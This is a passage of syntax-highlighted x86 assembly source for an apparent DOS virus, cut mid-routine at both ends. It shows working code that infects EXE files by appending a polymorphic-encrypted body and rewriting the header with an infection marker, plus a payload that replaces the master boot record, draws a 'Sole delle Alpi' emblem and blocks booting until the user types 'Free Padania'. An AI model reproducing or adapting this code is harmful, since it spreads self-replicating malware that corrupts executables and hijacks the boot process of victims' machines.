</span><span class="sc5">ok_lenght</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">exit_lenght</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01ffh</span><span class="sc0">                </span><span class="sc1">; can be divided by 1024</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_lenght</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;store length</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0fh</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; max garbage will be 0Fh or 1Fh ?</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_plus10</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">no_plus10</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">fast_infection</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">good_garbage</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">             </span><span class="sc1">; if fastinfection then limit the</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; max garbage in every section to</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; 3 or to 7 (randomly selected) so</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; it will be faster</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">good_garbage</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc5">good_garbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">saturn_size</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">smpe</span><span class="sc0">            </span><span class="sc1">; Call poly engine</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_poly</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">          </span><span class="sc1">; if error correct stack and exit</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_poly</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;write virus at end</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">inflenght</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;move at start</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseekfile</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seg_sta</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cs_must_equ_ss</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; SS = CS + 1 except when</span><span class="sc0">
                                                </span><span class="sc1">; BP used, so SS=CS</span><span class="sc0">
</span><span class="sc5">cs_must_equ_ss</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; new stack segment</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; just after body</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">500h</span><span class="sc0">                 </span><span class="sc1">; some more is needed</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">; new stack pointer</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; one page</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; new length</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; new length</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc12">'SS'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; set infection marker</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">                  </span><span class="sc1">; write new header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tmp_name</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; good infection, so put name</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">last_name</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; not to infect next time</span><span class="sc0">

</span><span class="sc5">exitexeinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">vir_24handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">lseekfile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">                 </span><span class="sc1">; move to start or end</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; Here starts the MBR that will be set on payload activation</span><span class="sc0">
</span><span class="sc5">payload_mbr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">; set SS:SP as usual</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                  </span><span class="sc1">; set to 80x25</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; set cursor invisible</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">                </span><span class="sc1">; set palette register</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2a0ah</span><span class="sc0">                </span><span class="sc1">; reg 0a to 2a, our green</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3f07h</span><span class="sc0">                </span><span class="sc1">; reg 07 to our white</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">disegno</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payload_mbr</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">)</span><span class="sc0">
                                                </span><span class="sc1">; DS:SI on our data</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; ES:DI video memory</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; since the "Sole delle Alpi" has two coordinates of simmetry we just have</span><span class="sc0">
</span><span class="sc1">; a quarter of it as data and we will calculate the other three points that</span><span class="sc0">
</span><span class="sc1">; are equal</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13d</span><span class="sc0">                  </span><span class="sc1">; lines to draw (in reality</span><span class="sc0">
                                                </span><span class="sc1">; 13 * 2 - 1, since the sun</span><span class="sc0">
                                                </span><span class="sc1">; is simmetric and the central</span><span class="sc0">
                                                </span><span class="sc1">; line will be drawn twice)</span><span class="sc0">
</span><span class="sc5">next_line</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">                  </span><span class="sc1">; every halfline (since the sun</span><span class="sc0">
                                                </span><span class="sc1">; is simmetric in both X and Y)</span><span class="sc0">
                                                </span><span class="sc1">; is made of 10 bytes</span><span class="sc0">
</span><span class="sc5">next_entry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; every byte contains 4 chars</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">this_word</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">07a20h</span><span class="sc0">               </span><span class="sc1">; colours and space char</span><span class="sc0">

                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; decode the char to be made</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">is_a_zero</span><span class="sc0">               </span><span class="sc1">; 11 = space</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; 00 = full rectangle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">draw_it</span><span class="sc0">                 </span><span class="sc1">; 01 = high half of rect.</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc0">                 </span><span class="sc1">; 10 = low half of rect.</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">draw_it</span><span class="sc0">
</span><span class="sc5">is_a_zero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">draw_it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">draw_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">23</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; here we calculate at which</span><span class="sc0">
</span><span class="sc5">dododo</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">; line we currently are (out</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80d</span><span class="sc0">                  </span><span class="sc1">; in BH) and in which column</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">okeee</span><span class="sc0">                   </span><span class="sc1">; (out in DX)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80d</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dododo</span><span class="sc0">
</span><span class="sc5">okeee</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; * 2, since the is also a</span><span class="sc0">
                                                </span><span class="sc1">; colour byte</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">09fh</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; calculate the coord. of the</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; point on the right half of</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; the display</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">lin_loo</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">160d</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">fin1</span><span class="sc0">                    </span><span class="sc1">; calculate the coord. of the</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc0">                      </span><span class="sc1">; point on the bottom half of</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">lin_loo</span><span class="sc0">                 </span><span class="sc1">; the display</span><span class="sc0">
</span><span class="sc5">fin1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_bass</span><span class="sc0">                </span><span class="sc1">; we must convert low half</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">                 </span><span class="sc1">; rect. to high and high to low</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">stototo</span><span class="sc0">
</span><span class="sc5">not_bass</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stototo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc0">
</span><span class="sc5">stototo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">09fh</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; finally the bottom right part</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">stosw</span><span class="sc0">                           </span><span class="sc1">; store the upper left part</span><span class="sc0">

        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">this_word</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">next_entry</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">; next line</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">next_line</span><span class="sc0">

</span><span class="sc1">; end of drawing</span><span class="sc0">

</span><span class="sc1">; SI is already on the string we have to check</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">kbd_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; get keystroke (wait if none)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; control if user is typing our</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">goto_start</span><span class="sc0">              </span><span class="sc1">; magic string</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; end of string</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_phrase</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">kbd_check</span><span class="sc0">
</span><span class="sc5">goto_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">kbd_check</span><span class="sc0">

</span><span class="sc5">good_phrase</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; If user says types in "Free Padania" then we will restore the original MBR</span><span class="sc0">
</span><span class="sc1">; and boot from there</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; correct stack</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
